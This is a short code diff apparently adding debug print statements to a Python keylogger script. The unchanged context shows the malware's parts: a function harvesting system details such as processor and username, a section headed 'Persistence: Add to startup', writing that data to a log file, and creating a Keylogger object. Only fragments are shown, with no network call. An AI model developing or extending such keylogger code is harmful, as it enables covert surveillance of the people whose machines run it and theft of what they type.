@@ -240,6 +240,8 @@ def collect_system_info() -> str:
     Processor: {platform.processor()}
     Username: {getenv('USER') if name != 'nt' else getenv('USERNAME')}
     """
+    print("System information collected:")  # Debug: Print system info
+    print(system_info)  # Debug: Print system info
     return system_info
 
 # Persistence: Add to startup
@@ -285,6 +287,7 @@ if __name__ == '__main__':
         system_info = collect_system_info()
         with open(FILENAME, 'a+') as fh:
             fh.write(system_info)
+        print(f"System information written to log file: {FILENAME}")  # Debug: Print log file path
 
         # Create objects
         keylogger = Keylogger()
